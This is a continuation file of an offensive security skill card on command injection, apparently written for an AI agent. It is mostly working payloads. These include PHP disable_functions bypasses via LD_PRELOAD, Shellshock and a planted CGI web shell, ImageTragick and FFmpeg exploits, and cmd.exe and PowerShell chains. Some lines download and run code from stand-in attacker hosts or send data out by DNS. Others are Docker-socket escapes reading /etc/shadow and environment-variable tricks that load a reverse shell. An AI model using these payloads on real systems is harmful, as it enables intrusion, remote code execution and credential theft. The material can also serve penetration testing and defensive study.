# cmdi-command-injection — 全文续篇

> 主卡保留前 10 节；本文件从第 11 节起。原文件：`/root/.hermes/skills/security/cmdi-command-injection/SKILL.md`

## 10. PHP disable_functions BYPASS PATHS

When `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()` are all disabled:

### Path 1: LD_PRELOAD + mail()/putenv()

```php
// 1. Upload shared object (.so) that hooks a libc function
// 2. Set LD_PRELOAD to point to it
putenv("LD_PRELOAD=/tmp/evil.so");
// 3. Trigger external process (mail() calls sendmail)
mail("<EMAIL-REDACTED>", "", "");
// The .so's constructor runs with shell access
```

### Path 2: Shellshock (CVE-2014-6271)

```php
// If bash is vulnerable to Shellshock:
putenv("PHP_LOL=() { :; }; /usr/bin/id > /tmp/out");
mail("<EMAIL-REDACTED>", "", "");
// Bash processes the function definition and runs the trailing command
```

### Path 3: Apache mod_cgi + .htaccess

```php
// Write .htaccess enabling CGI:
file_put_contents('/var/www/html/.htaccess', 'Options +ExecCGI\nAddHandler cgi-script .sh');
// Write CGI script:
file_put_contents('/var/www/html/cmd.sh', "#!/bin/bash\necho Content-type: text/html\necho\n$1");
chmod('/var/www/html/cmd.sh', 0755);
// Access: /cmd.sh?id
```

### Path 4: PHP-FPM / FastCGI

```php
// If PHP-FPM socket is accessible (/var/run/php-fpm.sock or port 9000):
// Send crafted FastCGI request to execute arbitrary PHP with different php.ini
// Tool: https://github.com/neex/phuip-fpizdam
// Override: PHP_VALUE=auto_prepend_file=/tmp/shell.php
```

### Path 5: COM Object (Windows)

```php
// Windows only, if COM extension enabled:
$wsh = new COM('WScript.Shell');
$exec = $wsh->Run('cmd /c whoami > C:\inetpub\wwwroot\out.txt', 0, true);
```

### Path 6: ImageMagick Delegate (CVE-2016-3714 "ImageTragick")

```php
// If ImageMagick processes user-uploaded images:
// Upload SVG/MVG with embedded command:
// Content of exploit.svg:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id > /tmp/pwned")'
pop graphic-context
```

**Also consider (summary):** iconv (CVE-2024-2961) via `php://filter/convert.iconv`; FFI (`FFI::cdef` + `libc`) when the extension is enabled.

---

## 11. COMPONENT-LEVEL COMMAND INJECTION

### ImageMagick Delegate Abuse

```
# MVG format with shell command in URL:
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id > /tmp/out`'
pop graphic-context

# Or via filename: convert '|id' out.png
```

### FFmpeg (HLS/concat protocol)

```
# SSRF/LFI via m3u8 playlist:
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://attacker.com/header.txt|file:///etc/passwd
#EXT-X-ENDLIST

# Upload as .m3u8, FFmpeg processes and may leak file contents in output
```

### Elasticsearch Groovy Script (pre-5.x)

```json
POST /_search
{
  "query": { "match_all": {} },
  "script_fields": {
    "cmd": {
      "script": "Runtime rt = Runtime.getRuntime(); rt.exec('id')"
    }
  }
}
```

### Ping/Traceroute/NSLookup Diagnostic Pages

```
# Classic injection point in network diagnostic features:
# Input: 127.0.0.1; id
# Input: 127.0.0.1 && cat /etc/passwd
# Input: `id`.attacker.com (DNS exfil via backtick)
# These features directly call OS commands with user input
```

**Other sinks (quick reference):** PDF generators (wkhtmltopdf / WeasyPrint with user HTML); Git wrappers (`git clone` URL / hooks).

---

## 12. WINDOWS CMD.EXE VS POWERSHELL INJECTION MATRIX

| Feature | cmd.exe | PowerShell |
|---------|---------|------------|
| **Command separator** | `&`, `&&`, `\|\|`, `;` (limited) | `;`, `\|`, `&` (call operator) |
| **Variable expansion** | `%VARIABLE%`, `!VAR!` (delayed) | `$env:VARIABLE`, `$Variable` |
| **Escape character** | `^` (caret) | `` ` `` (backtick) |
| **Command substitution** | `FOR /F` loops | `$()` subexpression |
| **Encoded execution** | N/A | `-EncodedCommand` (base64 UTF-16LE) |
| **Pipeline** | `\|` (stdout only) | `\|` (objects, not text) |
| **Comment** | `REM`, `::` | `#` |
| **String quoting** | `"double"` only | `"double"`, `'single'` (no expansion) |

### cmd.exe specific payloads

```batch
REM Command chaining
dir & whoami
dir && whoami
dir || whoami

REM Caret escape to bypass keyword filters
w^h^o^a^m^i
n^e^t u^s^e^r

REM Variable expansion injection
set CMD=whoami
%CMD%

REM Environment variable exfiltration via DNS
nslookup %USERNAME%.attacker.com
nslookup %COMPUTERNAME%.attacker.com

REM Delayed expansion (when !var! is enabled)
cmd /V:ON /C "set x=whoami&!x!"
```

### PowerShell specific payloads

```powershell
# Semicolon separator
Get-Process; whoami

# Subexpression
"$(whoami)"
Write-Output $(hostname)

# Base64 encoded command (UTF-16LE)
powershell -EncodedCommand dwBoAG8AYQBtAGkA
# Decodes to: whoami

# Invoke-Expression obfuscation
$a='who';$b='ami';iex "$a$b"
& (gcm *ke-*) "whoami"

# Download and execute
IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
IEX (iwr http://attacker/payload.ps1 -UseBasicParsing).Content

# Constrained Language Mode bypass (if available)
powershell -Version 2 -Command "whoami"
```

### Cross-platform payload differences

| Target | Time delay | DNS exfil | File read |
|--------|-----------|-----------|-----------|
| Linux/macOS | `sleep 5` | `nslookup $(whoami).atk.com` | `cat /etc/passwd` |
| cmd.exe | `timeout /T 5 /NOBREAK` | `nslookup %USERNAME%.atk.com` | `type C:\Windows\win.ini` |
| PowerShell | `Start-Sleep 5` | `nslookup $(whoami).atk.com` | `Get-Content C:\Windows\win.ini` |

### Detection-first polyglot

```text
;sleep${IFS}5;#&timeout /T 5 /NOBREAK&#
```

Works across sh/bash/cmd contexts — one of the separators will fire.

---

## 13. CONTAINER / K8S EXEC INJECTION

### kubectl exec injection

When a web application constructs `kubectl exec` commands with user input:

```text
# Vulnerable pattern
kubectl exec $POD_NAME -- /bin/sh -c "echo $USER_INPUT"

# Injection via pod name
POD_NAME="mypod -- /bin/sh -c whoami #"
→ kubectl exec mypod -- /bin/sh -c whoami # -- /bin/sh -c "echo ..."

# Injection via user input in command
USER_INPUT='"; cat /etc/passwd; echo "'
→ kubectl exec pod -- /bin/sh -c "echo ""; cat /etc/passwd; echo """
```

### Docker exec injection

```text
# Vulnerable web admin panel
docker exec $CONTAINER_NAME $COMMAND

# Injection via container name
CONTAINER_NAME="web_app -u root web_app"
→ docker exec web_app -u root web_app $COMMAND  (runs as root)

# Injection via command argument
COMMAND="status; cat /etc/shadow"
→ docker exec container /bin/sh -c "status; cat /etc/shadow"
```

### Container runtime API (unauthenticated)

```text
# Docker socket exposed (2375/2376 or /var/run/docker.sock)
POST /containers/create HTTP/1.1
{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"Binds":["/:/host"]}

# Then start + exec
POST /containers/{id}/start
POST /containers/{id}/exec {"Cmd":["cat","/host/etc/shadow"]}

# Kubernetes API (6443/8443 unauthenticated)
POST /api/v1/namespaces/default/pods/{name}/exec?command=whoami&stdout=true
```

### Sinks to watch for

| Component | Injection Vector |
|-----------|-----------------|
| CI/CD pipeline (Jenkins, GitLab CI) | Build step parameters, environment variables |
| Kubernetes CronJob | `.spec.containers[].command` from user-defined schedules |
| Helm chart values | `values.yaml` templated into pod specs with `{{ }}` |
| Container orchestration UI | "Run command" features in Portainer, Rancher, etc. |

---

## 14. ENVIRONMENT VARIABLE INJECTION

When an application allows setting or influencing environment variables, several variables have **implicit execution** semantics:

### Linux / Unix

| Variable | Effect | Exploitation |
|----------|--------|-------------|
| `LD_PRELOAD` | Loaded before any shared library; constructor runs on process start | `putenv("LD_PRELOAD=/tmp/evil.so"); mail("a@b","","");` |
| `LD_LIBRARY_PATH` | Overrides library search path | Place malicious `libc.so.6` in controlled directory |
| `BASH_ENV` | Executed when non-interactive bash starts | `BASH_ENV=/tmp/evil.sh` → any `system()` / `popen()` call sources it |
| `ENV` | Same as BASH_ENV for POSIX `sh` | `ENV=/tmp/evil.sh` |
| `PROMPT_COMMAND` | Executed before each interactive prompt | `PROMPT_COMMAND="curl http://atk.com/$(whoami)"` |
| `PS1` | Prompt string, supports `$()` expansion in bash | `PS1='$(cat /etc/passwd > /tmp/out) \$ '` |
| `PYTHONSTARTUP` | Python script executed on interpreter startup | Inject path to malicious `.py` file |
| `PERL5OPT` | Options passed to every Perl invocation | `PERL5OPT='-Mbase;system("id")'` |
| `NODE_OPTIONS` | Options passed to every Node.js invocation | `NODE_OPTIONS='--require /tmp/evil.js'` |
| `RUBYOPT` | Options for Ruby | `RUBYOPT='-r/tmp/evil.rb'` |

### Windows

| Variable | Effect |
|----------|--------|
| `COMSPEC` | Path to command interpreter; `system()` calls use this | Set to malicious executable |
| `PATH` | Command resolution order; place malicious binary earlier in path | DLL/EXE search order hijacking |
| `PSModulePath` | PowerShell auto-loads modules from these paths | Plant malicious module |

### Attack scenarios

**PHP `putenv()` + `mail()`**:
```php
// When putenv() is not disabled and mail() is available:
putenv("LD_PRELOAD=/tmp/evil.so");
mail("<EMAIL-REDACTED>","","","");
// mail() invokes sendmail → loads evil.so → constructor executes arbitrary code
```

**Git hook injection via environment**:
```bash
# GIT_DIR / GIT_WORK_TREE manipulation
GIT_DIR=/tmp/evil_repo/.git git status
# If hooks exist in the controlled repo, they execute
```

**Node.js `--require` injection**:
```bash
NODE_OPTIONS="--require=/tmp/reverse_shell.js" node /app/server.js
# reverse_shell.js is loaded before server.js
```

